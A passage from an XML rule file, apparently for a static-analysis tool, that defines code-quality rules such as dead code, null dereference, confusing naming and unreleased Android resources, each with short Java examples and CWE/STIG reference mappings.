that the first part of the expression <code>firstCall &amp;&amp; secondCall</code> will always evaluate to <code>false</code>.<br><br><pre><br>public void setUpCalls() {<br>  boolean firstCall = false;<br>  boolean secondCall = false;<br><br>  if (fCall &gt; 0) {<br>    setUpFCall();<br>    firstCall = false;<br>  }<br>  if (sCall &gt; 0) {<br>    setUpSCall();<br>    secondCall = true;<br>  }<br><br>  if (firstCall || secondCall) {<br>    setUpForCall();<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3050 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3050 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3050 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3050 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3050 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 570</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_dead_code_expression_is_always_true</key>
		<internalKey>Code Quality/Dead Code/Expression is Always true
		</internalKey>
		<name>Dead Code: Expression is Always true</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This expression (or part of it) will always evaluate to <code>true</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This expression (or part of it) will always evaluate to <code>true</code>; the program could be rewritten in a simpler form. The nearby code may be present for debugging purposes, or it may not have been maintained along with the rest of the program. The expression may also be indicative of a bug earlier in the method.<br><br><b>Example 1:</b> The following method never sets the variable <code>secondCall</code> after initializing it to <code>true</code>. (The variable <code>firstCall</code> is mistakenly used twice.)  The result is that the expression <code>firstCall || secondCall</code> will always evaluate to <code>true</code>, so <code>setUpForCall()</code> will always be invoked.<br><br><pre><br>public void setUpCalls() {<br>  boolean firstCall = true;<br>  boolean secondCall = true;<br><br>  if (fCall &lt; 0) {<br>    cancelFCall();<br>    firstCall = false;<br>  }<br>  if (sCall &lt; 0) {<br>    cancelSCall();<br>    firstCall = false;<br>  }<br><br>  if (firstCall || secondCall) {<br>    setUpForCall();<br>  }<br>}<br></pre><br><br><b>Example 2:</b> The following method tries to check the variables <code>firstCall</code> and <code>secondCall</code>. (The variable <code>firstCall</code> is mistakenly set to <code>true</code> instead of being checked.)  The result is that the first part of the expression <code>firstCall = true &amp;&amp; secondCall == true</code> will always evaluate to <code>true</code>.<br><br><pre><br>public void setUpCalls() {<br>  boolean firstCall = false;<br>  boolean secondCall = false;<br><br>  if (fCall &gt; 0) {<br>    setUpFCall();<br>    firstCall = true;<br>  }<br>  if (sCall &gt; 0) {<br>    setUpSCall();<br>    secondCall = true;<br>  }<br><br>  if (firstCall = true &amp;&amp; secondCall == true) {<br>    setUpDualCall();<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3050 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3050 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3050 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3050 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3050 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 571</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_dead_code_unused_field</key>
		<internalKey>Code Quality/Dead Code/Unused Field</internalKey>
		<name>Dead Code: Unused Field</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This field is never used.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This field is never accessed, except perhaps by dead code. Dead code is defined as code that is never directly or indirectly executed by a public method. It is likely that the field is simply vestigial, but it is also possible that the unused field points out a bug.<br><br><b>Example 1:</b> The field named <code>glue</code> is not used in the following class. The author of the class has accidentally put quotes around the field name, transforming it into a string constant.<br><br><pre><br>public class Dead {<br><br>  String glue;<br><br>  public String getGlue() {<br>    return "glue";<br>  }<br><br>}<br></pre><br><br><b>Example 2:</b> The field named <code>glue</code> is used in the following class, but only from a method that is never called.<br><br><pre><br>public class Dead {<br><br>  String glue;<br><br>  private String getGlue() {<br>    return glue;<br>  }<br><br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3050 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3050 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3050 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3050 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3050 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 561</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_dead_code_unused_method</key>
		<internalKey>Code Quality/Dead Code/Unused Method</internalKey>
		<name>Dead Code: Unused Method</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This method is not reachable from any method outside the class.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This method is never called or is only called from other dead code.<br><br><b>Example 1:</b> In the following class, the method <code>doWork()</code> can never be called.<br><br><pre><br>public class Dead {<br>  private void doWork() {<br>    System.out.println("doing work");<br>  }<br>  public static void main(String[] args) {<br>    System.out.println("running Dead");<br>  }<br>}<br></pre><br><br><b>Example 2:</b> In the following class, two private methods call each other, but since neither one is ever invoked from anywhere else, they are both dead code.<br><br><pre><br>public class DoubleDead {<br>  private void doTweedledee() {<br>    doTweedledumb();<br>  }<br>  private void doTweedledumb() {<br>    doTweedledee();<br>  }<br>  public static void main(String[] args) {<br>    System.out.println("running DoubleDead");<br>  }<br>}<br></pre><br><br>(In this case it is a good thing that the methods are dead: invoking either one would cause an infinite loop.)
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3050 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3050 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3050 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3050 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3050 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 561</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_null_dereference</key>
		<internalKey>Code Quality/Null Dereference</internalKey>
		<name>Null Dereference</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially dereference a null pointer, thereby causing a null pointer exception.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Null pointer exceptions usually occur when one or more of the programmer's assumptions is violated. A dereference-after-store error occurs when a program explicitly sets an object to <code>null</code> and dereferences it later. This error is often the result of a programmer initializing a variable to <code>null</code> when it is declared.<br><br><br>Most null pointer issues result in general software reliability problems, but if attackers can intentionally trigger a null pointer dereference, they can use the resulting exception to bypass security logic or to cause the application to reveal debugging information that will be valuable in planning subsequent attacks.<br><br><b>Example:</b> In the following code, the programmer explicitly sets the variable <code>foo</code> to <code>null</code>. Later, the programmer dereferences <code>foo</code> before checking the object for a null value.<br><br><pre><br>Foo foo = null;<br>...<br>foo.setBar(val);<br>...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 476</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_obsolete</key>
		<internalKey>Code Quality/Obsolete</internalKey>
		<name>Obsolete</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The use of deprecated or obsolete functions could indicate neglected code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  As programming languages evolve, methods occasionally become obsolete due to:<br><br>	- Advances in the language<br><br>	- Improved understanding of how operations should perform effectively and<br>	 securely<br><br>	- Changes in the conventions that govern certain operations<br><br>Methods that are removed from a language are usually replaced by newer counterparts that perform the same task in some different and hopefully better way.<br><br><b>Example:</b> The following code constructs a string object from an array of bytes and a value that specifies the top 8 bits of each 16-bit Unicode character.<br><br><pre><br>...<br>String name = new String(nameBytes, highByte);<br>...<br></pre><br><br>In this example, the constructor may fail to correctly convert bytes to characters depending upon which charset is used to encode the string represented by <code>nameBytes</code>. Due to the evolution of the charsets used to encode strings, this constructor was deprecated and replaced by a constructor that accepts as one of its parameters the name of the <code>charset</code> used to encode the bytes for conversion.<br><br>Not all functions are deprecated or replaced because they pose a security risk. However, the presence of an obsolete function often indicates that the surrounding code has been neglected and may be in a state of disrepair. Software security has not been a priority, or even a consideration, for very long. If the program uses deprecated or obsolete functions, it raises the probability that there are security problems lurking nearby.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 477</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_poor_style_confusing_naming_class_and_member</key>
		<internalKey>Code Quality/Poor Style/Confusing
			Naming(class_and_member)
		</internalKey>
		<name>Poor Style: Confusing Naming(class_and_member)</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A class member has the same name as the enclosing class.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Java allows class members to share the same name as the enclosing class, but taking advantage of this capability usually results in confusing and buggy code.<br><br><b>Example 1:</b> Consider the following class. Imagine trying to debug a problem with it.<br><br><pre><br>public class Name {<br><br>  private Name Name;<br><br>  public Name getName() {<br>    return Name.Name;<br>  }<br>}<br></pre><br><br><b>Example 2:</b> The following code excerpt from WebGoat demonstrates a bug that manifests itself as a confusing naming issue [1].<br><br><pre><br>public class CreateDB<br>{<br>	public void CreateDB() { }<br>	...<br>}<br></pre><br><br>The author intended to create a constructor for the <code>CreateDB</code> class, but inadvertently wrote in a return type (<code>void</code>) and created a regular method instead.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[2]  <em>The WebGoat Project</em> OWASP<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_poor_style_confusing_naming_member_and_method</key>
		<internalKey>Code Quality/Poor Style/Confusing
			Naming(member_and_method)
		</internalKey>
		<name>Poor Style: Confusing Naming(member_and_method)</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The class contains a field and a method with the same name.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is confusing to have a member field and a method with the same name. It makes it easy for a programmer to accidentally call the method when attempting to access the field or vice versa.<br><br><b>Example 1:</b><br><br><pre><br>public class Totaller {<br>  private int total;<br>  public int total() {<br>    ...<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_poor_style_empty_synchronized_block</key>
		<internalKey>Code Quality/Poor Style/Empty Synchronized Block
		</internalKey>
		<name>Poor Style: Empty Synchronized Block</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This synchronized block contains no statements; it is unlikely the synchronization achieves the intended effect.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Synchronization in Java can be tricky. An empty synchronized block is often a sign that a programmer is wrestling with synchronization but has not yet achieved the result they intend.<br><br><b>Example:</b><br><br><pre><br>synchronized(this) { }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 585</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_poor_style_identifier_contains_dollar_symbol___
		</key>
		<internalKey>Code Quality/Poor Style/Identifier Contains Dollar Symbol
			($)
		</internalKey>
		<name>Poor Style: Identifier Contains Dollar Symbol ($)</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a dollar sign ($) as part of an identifier is not recommended.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Section 3.8 of the Java Language Specification reserves the dollar sign ($) for identifiers that are used only in mechanically generated source code.<br><br><b>Example:</b><br><br><pre><br>int un$afe;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[2] J. Gosling, B. Joy, G. Steele, G. Bracha <em>The Java Language Specification, Second Edition</em> Addison-Wesley<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_poor_style_redundant_initialization</key>
		<internalKey>Code Quality/Poor Style/Redundant Initialization
		</internalKey>
		<name>Poor Style: Redundant Initialization</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The variable's value is assigned but never used, making it a dead store.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This variable's initial value is not used. After initialization, the variable is either assigned another value or goes out of scope.<br><br><b>Example:</b> The following code excerpt assigns to the variable <code>r</code> and then overwrites the value without using it.<br><br><pre><br>  int r = getNum();<br>  r = getNewNum(buf);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3050 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3050 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3050 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3050 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3050 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_poor_style_value_never_read</key>
		<internalKey>Code Quality/Poor Style/Value Never Read</internalKey>
		<name>Poor Style: Value Never Read</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The variable's value is assigned but never used, making it a dead store.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This variable's value is not used. After the assignment, the variable is either assigned another value or goes out of scope.<br><br><b>Example:</b> The following code excerpt assigns to the variable <code>r</code> and then overwrites the value without using it.<br><br><pre><br>  r = getName();<br>  r = getNewBuffer(buf);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3050 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3050 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3050 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3050 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3050 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 563</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_portability_flaw_file_separator</key>
		<internalKey>Code Quality/Portability Flaw/File Separator
		</internalKey>
		<name>Portability Flaw: File Separator</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The use of hardcoded file separators causes portability problems.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Different operating systems use different characters as file separators. For example, Microsoft Windows systems use "\", while UNIX systems use "/". When applications have to run on different platforms, the use of hardcoded file separators can lead to incorrect execution of application logic and potentially a denial of service.<br><br><br><br><b>Example 1:</b> The following code uses a hardcoded file separator to open a file:<br><br><pre><br>...<br>File file = new File(directoryName + "\\" + fileName);<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 474</em> <br></p>
																									   <p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_redundant_null_check</key>
		<internalKey>Code Quality/Redundant Null Check</internalKey>
		<name>Redundant Null Check</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially dereference a null pointer, thereby causing a null pointer exception.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Null pointer exceptions usually occur when one or more of the programmer's assumptions is violated. A check-after-dereference error occurs when a program dereferences an object that can be <code>null</code> before checking if the object is <code>null</code>.<br><br>Most null pointer issues result in general software reliability problems, but if attackers can intentionally trigger a null pointer dereference, they can use the resulting exception to bypass security logic or to cause the application to reveal debugging information that will be valuable in planning subsequent attacks.<br><br><b>Example:</b> In the following code, the programmer assumes that the variable <code>foo</code> is not <code>null</code> and confirms this assumption by dereferencing the object. However, the programmer later contradicts the assumption by checking <code>foo</code> against <code>null</code>. If <code>foo</code> can be <code>null</code> when it is checked in the <code>if</code> statement then it can also be <code>null</code> when it is dereferenced and might cause a null pointer exception. Either the dereference is unsafe or the subsequent check is unnecessary.<br><br><pre><br>foo.setBar(val);<br>...<br>if (foo != null) {<br>	...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 476</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_unreleased_resource_android_camera</key>
		<internalKey>Code Quality/Unreleased Resource/Android Camera
		</internalKey>
		<name>Unreleased Resource: Android Camera</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An Android activity fails to release the <code>Camera</code> instance in its <code>onPause()</code>, <code>onStop()</code>, or <code>onDestroy()</code> event handlers.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Android activity allocates a <code>Camera</code> instance that is not released in <code>onPause()</code>, <code>onStop()</code>, or <code>onDestroy()</code> callback. The Android OS invokes these callbacks whenever it needs to send the current activity to the background, or when it needs to temporarily destroy the activity when system resources are low. By failing to release the <code>Camera</code> object properly, the activity prevents other applications (or even future instances of the same application) from accessing the camera. Furthermore, maintaining possession of the <code>Camera</code> instance while the activity is paused can negatively impact the user's experience by unnecessarily draining the battery.<br><br><b>Example:</b> The following code describes an Android activity that does not override the base <code>onPause()</code> method, which should be used to release the <code>Camera</code> object, nor does it properly release it during its shutdown sequence.<br><br><pre><br>public class UnreleasedCameraActivity extends Activity {<br>  private Camera cam;<br><br>  @Override<br>  public void onCreate(Bundle state) {<br>      ...<br>  }<br><br>  @Override<br>  public void onRestart() {<br>      ...<br>  }<br><br>  @Override<br>  public void onStop() {<br>      cam.stopPreview();<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7]  <em>Camera, Android Developers</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404, CWE ID 619</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_unreleased_resource_android_media</key>
		<internalKey>Code Quality/Unreleased Resource/Android Media
		</internalKey>
		<name>Unreleased Resource: Android Media</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An Android activity fails to release the <code>MediaRecorder</code>, <code>MediaPlayer</code>, or <code>AudioRecord</code> object in its <code>onPause()</code>, <code>onStop()</code>, or <code>onDestroy()</code> event handlers.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Android activity allocates a media object that is not released in <code>onPause()</code>, <code>onStop()</code>, or <code>onDestroy()</code> callback. The Android OS invokes these callbacks whenever it needs to send the current activity to the background, or when it needs to temporarily destroy the activity when system resources are low. By failing to release the media object properly, the activity causes subsequent accesses to Android's media hardware (by other applications or even the same application) to fall back to the software implementations, or even fail altogether. Leaving too many unreleased media instances open can lead Android to throw exceptions, effectively causing a denial of service. Furthermore, maintaining possession of the media instance while the activity is paused can negatively impact the user's experience by unnecessarily draining the battery.<br><br><b>Example:</b> The following code describes an Android activity that does not override the base <code>onPause()</code> method, which should be used to release the media object, nor does it properly release it during its shutdown sequence.<br><br><pre><br>public class UnreleasedMediaActivity extends Activity {<br>  private MediaPlayer mp;<br><br>  @Override<br>  public void onCreate(Bundle state) {<br>      ...<br>  }<br><br>  @Override<br>  public void onRestart() {<br>      ...<br>  }<br><br>  @Override<br>  public void onStop() {<br>      mp.stop();<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7]  <em>Audio Capture, Android Developers</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404, CWE ID 619</em> <br></p>
																									   <p>[9]  <em>Media Player, Android Developers</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_unreleased_resource_android_sqlite_database</key>
		<internalKey>Code Quality/Unreleased Resource/Android SQLite Database
		</internalKey>
		<name>Unreleased Resource: Android SQLite Database</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An Android activity fails to release the Android database handler in its <code>onPause()</code>, <code>onStop()</code>, or <code>onDestroy()</code> event handlers.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Android activity maintains an Android SQLite database handler that is not closed in <code>onPause()</code>, <code>onStop()</code>, or <code>onDestroy()</code> callback. The Android OS invokes these callbacks whenever it needs to send the current activity to the background, or when it needs to temporarily destroy the activity when system resources are low. By failing to close the database properly, the activity can potentially exhaust the device of available cursors if the activity is constantly restarted. In addition, depending on the implementation, the Android operating system can also throws <code>DatabaseObjectNotClosedException</code>, which crashes the application if the exception is not caught.<br><br><b>Example:</b> The following code describes an Android activity that caches user data and writes the data to disk when the activity is stopped. Note that does not override the base <code>onPause()</code>, which should be used to release the database object, nor does it properly release it during its shutdown sequence.<br><br><pre><br>public class MyDBHelper extends SQLiteOpenHelper {<br>  ...<br>}<br><br>public class UnreleasedDBActivity extends Activity {<br>  private myDBHelper dbHelper;<br>  private SQLiteDatabase db;<br><br>  @Override<br>  public void onCreate(Bundle state) {<br>      ...<br>      db = dbHelper.getWritableDatabase();<br>      ...<br>  }<br><br>  @Override<br>  public void onRestart() {<br>      ...<br>  }<br><br>  @Override<br>  public void onStop() {<br>      db.insert(cached_data);     // flush cached data<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
